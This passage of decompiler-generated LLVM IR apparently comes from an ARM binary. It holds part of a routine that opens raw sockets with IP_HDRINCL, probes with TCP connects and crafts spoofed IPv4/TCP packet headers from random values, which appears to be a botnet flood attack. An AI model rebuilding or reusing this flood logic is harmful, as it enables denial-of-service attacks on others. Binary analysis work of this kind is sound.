dec_label_pc_ad60:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad7c = call i32 @__GI_setsockopt(i32 %v3_ad50, i32 0, i32 3, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad7c, i32* %r0.global-to-local, align 4
  %v7_ad80 = icmp eq i32 %v5_ad7c, -1
  store i1 %v7_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad80, label %dec_label_pc_af3c, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad60
  %v0_ad88 = load i32, i32* @r7, align 4
  %v3_ad88 = mul i32 %v0_ad88, 65536
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad90 = load i32, i32* @r6, align 4
  %v2_ad90 = icmp eq i32 %v0_ad90, 0
  store i1 %v2_ad90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad98 = urem i32 %v0_ad88, 65536
  store i32 %v3_ad98, i32* @fp, align 4
  br i1 %v2_ad90, label %dec_label_pc_b1c8, label %dec_label_pc_ada0.preheader

dec_label_pc_ada0.preheader:                      ; preds = %dec_label_pc_ad88
  %v2_adec = ptrtoint i32* %stack_var_-144 to i32
  %v2_ae30 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae68 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae74 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae78 = ptrtoint i32* %stack_var_-48 to i32
  %v4_aed8 = zext i8 %tmp to i32
  %v1_aedc = and i32 %v4_aed8, 18
  %v2_aee0 = icmp eq i32 %v1_aedc, 18
  %v4_b084 = sext i8 %v5_abe0 to i32
  %sext = mul i32 %v5_abfc, 16777216
  %v4_b094 = sdiv i32 %sext, 16777216
  %v3_aec4 = sext i16 %tmp61 to i32
  %v1_aee8 = and i32 %v4_aed8, 5
  %v2_aee8 = icmp eq i32 %v1_aee8, 0
  %v4_ae28 = add i32 %v2_adec, 82
  %v5_ae28 = inttoptr i32 %v4_ae28 to i16*
  %v1_b018 = add i32 %v6_ad1c, 40
  %v1_b12c = urem i32 %v5_ac5c, 2
  %tmp97 = sub nsw i32 0, %v1_b12c
  %v4_b134 = and i32 %tmp97, 32
  %v1_b144 = urem i32 %v6_ac7c, 2
  %tmp98 = sub nsw i32 0, %v1_b144
  %v4_b14c = and i32 %tmp98, 16
  %v1_b15c = urem i32 %v6_ac9c, 2
  %tmp99 = sub nsw i32 0, %v1_b15c
  %v4_b164 = and i32 %tmp99, 8
  %v1_b174 = urem i32 %v6_acbc, 2
  %tmp100 = sub nsw i32 0, %v1_b174
  %v4_b17c = and i32 %tmp100, 4
  %v1_b18c = urem i32 %v6_acdc, 2
  %tmp101 = sub nsw i32 0, %v1_b18c
  %v3_b194 = and i32 %tmp101, 2
  %v1_b1a4 = urem i32 %v6_acfc, 2
  br label %dec_label_pc_ada0

dec_label_pc_ada0:                                ; preds = %dec_label_pc_ada0.preheader, %dec_label_pc_af14
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_af14 ], [ %tmp34, %dec_label_pc_ada0.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_af14 ], [ %tmp37, %dec_label_pc_ada0.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_adac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_adac, i32* %r0.global-to-local, align 4
  %v7_adb0 = icmp eq i32 %v3_adac, -1
  store i1 %v7_adb0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_adac, i32* @r5, align 4
  br i1 %v7_adb0, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_adbc:                                ; preds = %dec_label_pc_ada0, %dec_label_pc_aef0
  %v0_adc4 = phi i32 [ %v3_af04, %dec_label_pc_aef0 ], [ %v3_adac, %dec_label_pc_ada0 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_aef0 ], [ %stack_var_-62.0, %dec_label_pc_ada0 ]
  %stack_var_-60.1 = phi i32 [ %v0_afc4, %dec_label_pc_aef0 ], [ %stack_var_-60.0, %dec_label_pc_ada0 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_adc4 = call i32 @__libc_fcntl(i32 %v0_adc4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_adcc = or i32 %v2_adc4, 2048
  store i32 %v1_adcc, i32* @r2, align 4
  %v0_add0 = load i32, i32* @r5, align 4
  store i32 %v0_add0, i32* %r0.global-to-local, align 4
  %v2_add4 = call i32 @__libc_fcntl(i32 %v0_add0, i32 4)
  %v3_add8 = load i32, i32* %stack_var_-44, align 4
  %v5_ade0 = mul i32 %v3_add8, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_adf4 = add i32 %v5_ade0, %arg2
  store i32 %v2_adf4, i32* %r3.global-to-local, align 4
  %v1_adf8 = add i32 %v2_adf4, 20
  %v2_adf8 = inttoptr i32 %v1_adf8 to i8*
  %v3_adf8 = load i8, i8* %v2_adf8, align 1
  %v4_adf8 = zext i8 %v3_adf8 to i32
  store i32 %v4_adf8, i32* %r2.global-to-local, align 4
  %v2_adfc = icmp ugt i8 %v3_adf8, 30
  %v7_adfc = icmp eq i8 %v3_adf8, 31
  store i1 %v7_adfc, i1* %cpsr_z.global-to-local, align 1
  %v2_ae00 = xor i1 %v7_adfc, true
  %v3_ae00 = and i1 %v2_adfc, %v2_ae00
  br i1 %v3_ae00, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_adbc
  %v5_ae00 = add i32 %v2_adf4, 16
  %v6_ae00 = inttoptr i32 %v5_ae00 to i32*
  %v7_ae00 = load i32, i32* %v6_ae00, align 4
  store i32 %v7_ae00, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_adbc, %bb
  %v4_ae04 = phi i32 [ %v2_adf4, %dec_label_pc_adbc ], [ %v7_ae00, %bb ]
  %v4_ae04.stack_var_-60.1 = select i1 %v3_ae00, i32 %v4_ae04, i32 %stack_var_-60.1
  %v2_ae08 = xor i1 %v2_adfc, true
  %v3_ae08 = or i1 %v7_adfc, %v2_ae08
  br i1 %v3_ae08, label %dec_label_pc_af50, label %dec_label_pc_ae0c

dec_label_pc_ae0c:                                ; preds = %bb71, %dec_label_pc_af50
  %v0_afc4 = phi i32 [ %v5_afa0, %dec_label_pc_af50 ], [ %v4_ae04.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ae14 = load i32, i32* @sl, align 4
  %v9_ae14 = icmp eq i32 %v0_ae14, 65535
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ae14, label %dec_label_pc_afac, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_ae0c
  %v4_ae18 = udiv i32 %v0_ae14, 256
  %v2_ae1c = urem i32 %v0_ae14, 256
  store i32 %v2_ae1c, i32* %r2.global-to-local, align 4
  %v5_ae20 = mul nuw nsw i32 %v2_ae1c, 256
  %v6_ae20 = or i32 %v5_ae20, %v4_ae18
  store i32 %v6_ae20, i32* %r3.global-to-local, align 4
  store i32 %v2_adec, i32* %r0.global-to-local, align 4
  %v2_ae28 = trunc i32 %v6_ae20 to i16
  store i16 %v2_ae28, i16* %v5_ae28, align 2
  br label %dec_label_pc_ae30

dec_label_pc_ae30:                                ; preds = %.thread9, %dec_label_pc_afac
  %stack_var_-62.2 = phi i16 [ %v1_afac, %dec_label_pc_afac ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_ae30, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ae38 = load i32, i32* @r5, align 4
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  %v3_ae3c = call i32 @__libc_connect(i32 %v0_ae38, i32 %v2_ae30, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ae44 = call i32 @__GI_time(i32* null)
  store i32 %v2_ae44, i32* %r0.global-to-local, align 4
  store i32 %v2_ae44, i32* @r4, align 4
  %v9_aea4 = icmp eq i32 %tmp35, %v0_afc4
  %v4_aecc = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_aea4 to i32
  %v9_aeb8 = icmp eq i1 %v9_aea4, false
  %v9_aed0 = icmp eq i32 %v3_aec4, %v4_aecc
  br label %dec_label_pc_ae60

dec_label_pc_ae50:                                ; preds = %.thread, %dec_label_pc_aec0, %dec_label_pc_aee8, %bb75
  %v2_ae50 = call i32 @__GI_time(i32* null)
  %v0_ae54 = load i32, i32* @r4, align 4
  %v2_ae54 = sub i32 %v2_ae50, %v0_ae54
  store i32 %v2_ae54, i32* %r0.global-to-local, align 4
  %v7_ae58 = icmp eq i32 %v2_ae54, 10
  store i1 %v7_ae58, i1* %cpsr_z.global-to-local, align 1
  %v8_ae5c = icmp sgt i32 %v2_ae54, 10
  br i1 %v8_ae5c, label %dec_label_pc_aef0, label %dec_label_pc_ae60

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ae50, %dec_label_pc_ae30
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_ae74, i32* %r1.global-to-local, align 4
  store i32 %v2_ae78, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ae80 = load i32, i32* @sb, align 4
  store i32 %v0_ae80, i32* %r0.global-to-local, align 4
  %v6_ae88 = call i32 @__libc_recvfrom(i32 %v0_ae80, i32 %v2_ae74, i32 256, i32 16384, i32 %v2_ae68, i32 %v2_ae78)
  store i32 %v6_ae88, i32* %r2.global-to-local, align 4
  %v7_ae90 = icmp eq i32 %v6_ae88, -1
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_ae90, label %dec_label_pc_af44, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae60
  store i32 %v0_afc4, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_aeb0 = icmp eq i32 %v6_ae88, 40
  store i1 %v7_aeb0, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_ae88, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_ae9c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ae50

bb75:                                             ; preds = %dec_label_pc_ae9c
  store i1 %v9_aeb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb8, label %dec_label_pc_ae50, label %dec_label_pc_aec0

dec_label_pc_aec0:                                ; preds = %bb75
  store i32 %v3_aec4, i32* @lr, align 4
  store i32 %v2_adec, i32* @r3, align 4
  store i32 %v4_aecc, i32* %r2.global-to-local, align 4
  store i1 %v9_aed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aed0, label %dec_label_pc_aed8, label %dec_label_pc_ae50

dec_label_pc_aed8:                                ; preds = %dec_label_pc_aec0
  store i32 %v4_aed8, i32* %r2.global-to-local, align 4
  store i32 %v1_aedc, i32* @r3, align 4
  store i1 %v2_aee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee0, label %dec_label_pc_afbc, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aed8
  store i1 %v2_aee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aee8, label %dec_label_pc_ae50, label %dec_label_pc_aef0

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aee8, %dec_label_pc_ae50
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r0.global-to-local, align 4
  %v1_aef4 = call i32 @__GI___libc_close(i32 %v0_aef0)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_af04 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  %v3_af08 = icmp eq i32 %v3_af04, -1
  %v8_af08 = icmp eq i32 %v3_af04, -1
  store i1 %v8_af08, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_af04, i32* @r5, align 4
  br i1 %v3_af08, label %dec_label_pc_af14, label %dec_label_pc_adbc

dec_label_pc_af14:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ada0, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_ada0 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_aef0 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_ada0 ], [ %v0_afc4, %bb82 ], [ %v0_afc4, %dec_label_pc_aef0 ]
  %v3_af14 = load i32, i32* %stack_var_-44, align 4
  %v1_af18 = add i32 %v3_af14, 1
  store i32 %v1_af18, i32* @r3, align 4
  %v1_af1c = load i32, i32* @r6, align 4
  %v9_af1c = icmp eq i32 %v1_af18, %v1_af1c
  store i1 %v9_af1c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af18, i32* %stack_var_-44, align 4
  %v5_af24 = icmp slt i32 %v1_af18, %v1_af1c
  br i1 %v5_af24, label %dec_label_pc_ada0, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af14
  store i32 %v6_ad1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1d8

dec_label_pc_af3c:                                ; preds = %dec_label_pc_ad60
  %v0_af3c = load i32, i32* @sb, align 4
  store i32 %v0_af3c, i32* %r0.global-to-local, align 4
  %v1_af40 = call i32 @__GI___libc_close(i32 %v0_af3c)
  store i32 %v1_af40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_ae60, %entry, %dec_label_pc_af3c
  %v1_af4c = phi i32 [ %v3_ad50, %entry ], [ %v1_af40, %dec_label_pc_af3c ], [ 0, %dec_label_pc_ae60 ]
  store i32 %v27_ab7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_af4c

dec_label_pc_af50:                                ; preds = %bb71
  %v1_af50 = add i32 %v4_ae04, 16
  %v2_af50 = inttoptr i32 %v1_af50 to i32*
  %v3_af50 = load i32, i32* %v2_af50, align 4
  store i32 %v3_af50, i32* @r4, align 4
  %v0_af54 = call i32 @rand_next()
  store i32 %v0_af54, i32* %r0.global-to-local, align 4
  %v3_af58 = load i32, i32* %stack_var_-44, align 4
  %v5_af60 = mul i32 %v3_af58, 24
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = and i32 %v0_af68, 16711680
  store i32 %v1_af68, i32* %ip.global-to-local, align 4
  %v3_af6c = udiv i32 %v0_af68, 16777216
  %v2_af70 = add i32 %v5_af60, %arg2
  store i32 %v2_af70, i32* %r1.global-to-local, align 4
  %v4_af74 = udiv i32 %v1_af68, 256
  %v5_af74 = or i32 %v4_af74, %v3_af6c
  store i32 %v5_af74, i32* %r2.global-to-local, align 4
  %v1_af78 = and i32 %v0_af68, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_af78, i32* %r3.global-to-local, align 4
  %v1_af7c = add i32 %v2_af70, 20
  %v2_af7c = inttoptr i32 %v1_af7c to i8*
  %v3_af7c = load i8, i8* %v2_af7c, align 1
  %v4_af7c = zext i8 %v3_af7c to i32
  store i32 %v4_af7c, i32* %ip.global-to-local, align 4
  %v4_af80 = mul i32 %v1_af78, 256
  %v4_af84 = mul i32 %v0_af68, 16777216
  %v5_af80 = or i32 %v4_af80, %v4_af84
  %v5_af84 = or i32 %v5_af80, %v5_af74
  %v7_af88 = lshr i32 %v0_af54, %v4_af7c
  %v8_af88 = add i32 %v7_af88, %v5_af84
  store i32 %v8_af88, i32* %r2.global-to-local, align 4
  %v1_af8c = and i32 %v8_af88, 16711680
  store i32 %v1_af8c, i32* %r0.global-to-local, align 4
  %v1_af98 = and i32 %v8_af88, 65280
  store i32 %v1_af98, i32* %r1.global-to-local, align 4
  %v5_afa0 = call i32 @llvm.bswap.i32(i32 %v8_af88)
  store i32 %v5_afa0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ae0c

dec_label_pc_afac:                                ; preds = %dec_label_pc_ae0c
  %v0_afac = call i32 @rand_next()
  %v1_afac = trunc i32 %v0_afac to i16
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  store i32 %v2_adec, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ae30

dec_label_pc_afbc:                                ; preds = %dec_label_pc_aed8
  %v3_afbc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afbc, i32* @r4, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v5_afc4 = mul i32 %v3_afbc, 16
  %v6_afc4 = add i32 %v5_afc4, %v2_ab98
  %v7_afc4 = inttoptr i32 %v6_afc4 to i32*
  store i32 %v0_afc4, i32* %v7_afc4, align 4
  %v0_afc8 = load i32, i32* @r8, align 4
  %v1_afc8 = add i32 %v0_afc8, 4
  %v2_afc8 = inttoptr i32 %v1_afc8 to i32*
  %v3_afc8 = load i32, i32* %v2_afc8, align 4
  store i32 %v3_afc8, i32* %r1.global-to-local, align 4
  %v3_afd0 = udiv i32 %v3_afc8, 16777216
  %v1_afd4 = and i32 %v3_afc8, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v1_afcc = udiv i32 %v3_afc8, 256
  %v4_afd8 = and i32 %v1_afcc, 65280
  store i32 %v2_ab98, i32* %r0.global-to-local, align 4
  %v4_afe0 = mul i32 %v1_afd4, 256
  %v0_afe4 = load i32, i32* @r4, align 4
  %v3_afe4 = mul i32 %v0_afe4, 16
  %v2_afe8 = add i32 %v3_afe4, %v2_ab98
  store i32 %v2_afe8, i32* %ip.global-to-local, align 4
  %v4_afec = mul i32 %v3_afc8, 16777216
  %v5_afd8 = or i32 %v4_afec, %v3_afd0
  %v5_afe0 = or i32 %v5_afd8, %v4_afd8
  %v5_afec = or i32 %v5_afe0, %v4_afe0
  store i32 %v5_afec, i32* %r3.global-to-local, align 4
  %v2_aff0 = add i32 %v2_afe8, 4
  %v3_aff0 = inttoptr i32 %v2_aff0 to i32*
  store i32 %v5_afec, i32* %v3_aff0, align 4
  %v0_aff4 = load i32, i32* @r8, align 4
  %v1_aff4 = add i32 %v0_aff4, 8
  %v2_aff4 = inttoptr i32 %v1_aff4 to i32*
  %v3_aff4 = load i32, i32* %v2_aff4, align 4
  store i32 %v3_aff4, i32* %r1.global-to-local, align 4
  %v1_aff8 = and i32 %v3_aff4, 16711680
  store i32 %v1_aff8, i32* %r0.global-to-local, align 4
  %v3_affc = udiv i32 %v3_aff4, 16777216
  %v1_b000 = and i32 %v3_aff4, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v4_b004 = udiv i32 %v1_aff8, 256
  %v4_b008 = mul i32 %v1_b000, 256
  store i32 %v6_ad1c, i32* %r2.global-to-local, align 4
  %v4_b010 = mul i32 %v3_aff4, 16777216
  %v5_b004 = or i32 %v4_b010, %v3_affc
  %v5_b008 = or i32 %v5_b004, %v4_b004
  %v5_b010 = or i32 %v5_b008, %v4_b008
  store i32 %v5_b010, i32* %r3.global-to-local, align 4
  %v1_b014 = add i32 %v0_aff4, 2
  %v2_b014 = inttoptr i32 %v1_b014 to i16*
  %v3_b014 = load i16, i16* %v2_b014, align 2
  %v4_b014 = zext i16 %v3_b014 to i32
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  store i32 %v1_b018, i32* @r7, align 4
  %v0_b01c = load i32, i32* @lr, align 4
  %v1_b01c = trunc i32 %v0_b01c to i16
  %v2_b01c = load i32, i32* %ip.global-to-local, align 4
  %v3_b01c = add i32 %v2_b01c, 14
  %v4_b01c = inttoptr i32 %v3_b01c to i16*
  store i16 %v1_b01c, i16* %v4_b01c, align 2
  %v0_b020 = load i32, i32* %r1.global-to-local, align 4
  %v1_b020 = trunc i32 %v0_b020 to i16
  %v2_b020 = load i32, i32* %ip.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 12
  %v4_b020 = inttoptr i32 %v3_b020 to i16*
  store i16 %v1_b020, i16* %v4_b020, align 2
  %v0_b024 = load i32, i32* %r3.global-to-local, align 4
  %v1_b024 = load i32, i32* %ip.global-to-local, align 4
  %v2_b024 = add i32 %v1_b024, 8
  %v3_b024 = inttoptr i32 %v2_b024 to i32*
  store i32 %v0_b024, i32* %v3_b024, align 4
  %v0_b028 = load i32, i32* @r7, align 4
  store i32 %v0_b028, i32* @r0, align 4
  %v0_b02c = call i32 @malloc()
  store i32 %v0_b02c, i32* %r0.global-to-local, align 4
  store i32 %v2_aba8, i32* %r3.global-to-local, align 4
  %v2_b038 = load i32, i32* @r4, align 4
  %v5_b038 = mul i32 %v2_b038, 4
  %v6_b038 = add i32 %v5_b038, %v2_aba8
  %v7_b038 = inttoptr i32 %v6_b038 to i32*
  store i32 %v0_b02c, i32* %v7_b038, align 4
  %v3_b03c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b03c, i32* %r2.global-to-local, align 4
  %v0_b040 = load i32, i32* %r3.global-to-local, align 4
  %v4_b040 = mul i32 %v3_b03c, 4
  %v5_b040 = add i32 %v0_b040, %v4_b040
  %v6_b040 = inttoptr i32 %v5_b040 to i32*
  %v7_b040 = load i32, i32* %v6_b040, align 4
  store i32 %v7_b040, i32* @r4, align 4
  %v1_b044 = inttoptr i32 %v7_b040 to i8*
  %v2_b044 = load i8, i8* %v1_b044, align 1
  %tmp103 = urem i8 %v2_b044, 16
  %v1_b048 = zext i8 %tmp103 to i32
  %v1_b04c = or i32 %v1_b048, 64
  store i32 %v1_b04c, i32* %r3.global-to-local, align 4
  %v1_b050 = trunc i32 %v1_b04c to i8
  store i8 %v1_b050, i8* %v1_b044, align 1
  %v0_b054 = load i32, i32* @r4, align 4
  %v1_b054 = inttoptr i32 %v0_b054 to i8*
  %v2_b054 = load i8, i8* %v1_b054, align 1
  %v0_b058 = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b058, 256
  %v1_b060 = and i8 %v2_b054, -16
  %v1_b064 = or i8 %v1_b060, 5
  %v1_b068 = and i32 %tmp77, and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960)
  %tmp78 = udiv i32 %v0_b058, 256
  %v4_b06c = urem i32 %tmp78, 256
  %v5_b06c = or i32 %v4_b06c, %v1_b068
  store i32 %v5_b06c, i32* %r2.global-to-local, align 4
  %v0_b070 = load i32, i32* @fp, align 4
  %v1_b070 = urem i32 %v0_b070, 256
  store i32 %v1_b070, i32* %r0.global-to-local, align 4
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  %v3_b078 = udiv i32 %v0_b070, 256
  store i32 %v3_b078, i32* %r1.global-to-local, align 4
  store i8 %v1_b064, i8* %v1_b054, align 1
  %v0_b080 = load i32, i32* %r1.global-to-local, align 4
  %v1_b080 = load i32, i32* %r0.global-to-local, align 4
  %v4_b080 = mul i32 %v1_b080, 256
  %v5_b080 = or i32 %v4_b080, %v0_b080
  store i32 %v5_b080, i32* %r1.global-to-local, align 4
  store i32 %v4_b084, i32* %r0.global-to-local, align 4
  %v2_b088 = load i32, i32* @r4, align 4
  %v3_b088 = add i32 %v2_b088, 1
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v5_abe0, i8* %v4_b088, align 1
  %v0_b08c = load i32, i32* %r1.global-to-local, align 4
  %v1_b08c = trunc i32 %v0_b08c to i16
  %v2_b08c = load i32, i32* @r4, align 4
  %v3_b08c = add i32 %v2_b08c, 4
  %v4_b08c = inttoptr i32 %v3_b08c to i16*
  store i16 %v1_b08c, i16* %v4_b08c, align 2
  %v0_b090 = load i32, i32* %ip.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v0_b090, 0
  store i1 %v2_b090, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b094, i32* %r1.global-to-local, align 4
  %v0_b098 = load i32, i32* %r2.global-to-local, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r4, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b090, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_afbc
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_afbc, %bb79
  %v0_b0a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0a4 = trunc i32 %v0_b0a4 to i8
  %v2_b0a4 = load i32, i32* @r4, align 4
  %v3_b0a4 = add i32 %v2_b0a4, 8
  %v4_b0a4 = inttoptr i32 %v3_b0a4 to i8*
  store i8 %v1_b0a4, i8* %v4_b0a4, align 1
  %v0_b0a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0a8 = trunc i32 %v0_b0a8 to i8
  %v2_b0a8 = load i32, i32* @r4, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 9
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b0a8, i8* %v4_b0a8, align 1
  %v0_b0ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0ac, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b0ac = load i32, i32* %r2.global-to-local, align 4
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  %v3_b0ac = load i32, i32* @r4, align 4
  %v4_b0ac = add i32 %v3_b0ac, 6
  %v5_b0ac = inttoptr i32 %v4_b0ac to i16*
  store i16 %v2_b0ac, i16* %v5_b0ac, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_25d48.57 to i32), i32* %r2.global-to-local, align 4
  %v2_b0b4 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_b0b4, i32* %r1.global-to-local, align 4
  %v1_b0b8 = load i32, i32* @r4, align 4
  %v2_b0b8 = add i32 %v1_b0b8, 12
  %v3_b0b8 = inttoptr i32 %v2_b0b8 to i32*
  store i32 %v2_b0b4, i32* %v3_b0b8, align 4
  %v3_b0bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b0bc, i32* %r3.global-to-local, align 4
  store i32 %v2_ab98, i32* %ip.global-to-local, align 4
  %v4_b0c4 = mul i32 %v3_b0bc, 16
  %v5_b0c4 = add i32 %v4_b0c4, %v2_ab98
  %v6_b0c4 = inttoptr i32 %v5_b0c4 to i32*
  %v7_b0c4 = load i32, i32* %v6_b0c4, align 4
  store i32 %v7_b0c4, i32* %r2.global-to-local, align 4
  store i32 %v5_b0c4, i32* %r3.global-to-local, align 4
  %v1_b0d0 = load i32, i32* @r4, align 4
  %v2_b0d0 = add i32 %v1_b0d0, 16
  %v3_b0d0 = inttoptr i32 %v2_b0d0 to i32*
  store i32 %v7_b0c4, i32* %v3_b0d0, align 4
  %v0_b0d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b0d4 = add i32 %v0_b0d4, 12
  %v2_b0d4 = inttoptr i32 %v1_b0d4 to i16*
  %v3_b0d4 = load i16, i16* %v2_b0d4, align 2
  %v4_b0d4 = zext i16 %v3_b0d4 to i32
  store i32 %v4_b0d4, i32* %r0.global-to-local, align 4
  %v1_b0d8 = add i32 %v0_b0d4, 8
  %v2_b0d8 = inttoptr i32 %v1_b0d8 to i32*
  %v3_b0d8 = load i32, i32* %v2_b0d8, align 4
  store i32 %v3_b0d8, i32* %r1.global-to-local, align 4
  %v2_b0dc = load i32, i32* @r4, align 4
  %v3_b0dc = add i32 %v2_b0dc, 20
  %v4_b0dc = inttoptr i32 %v3_b0dc to i16*
  store i16 %v3_b0d4, i16* %v4_b0dc, align 2
  %v0_b0e0 = load i32, i32* @r4, align 4
  %v1_b0e0 = add i32 %v0_b0e0, 20
  store i32 %v1_b0e0, i32* @r8, align 4
  %v1_b0e4 = add i32 %v0_b0e0, 33
  %v2_b0e4 = inttoptr i32 %v1_b0e4 to i8*
  %v3_b0e4 = load i8, i8* %v2_b0e4, align 1
  %v4_b0e4 = zext i8 %v3_b0e4 to i32
  store i32 %v4_b0e4, i32* %r2.global-to-local, align 4
  %v0_b0e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b0e8 = add i32 %v0_b0e0, 24
  %v3_b0e8 = inttoptr i32 %v2_b0e8 to i32*
  store i32 %v0_b0e8, i32* %v3_b0e8, align 4
  %v0_b0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b0ec = or i32 %v0_b0ec, 1
  store i32 %v1_b0ec, i32* %r2.global-to-local, align 4
  %v0_b0f0 = load i32, i32* %r3.global-to-local, align 4
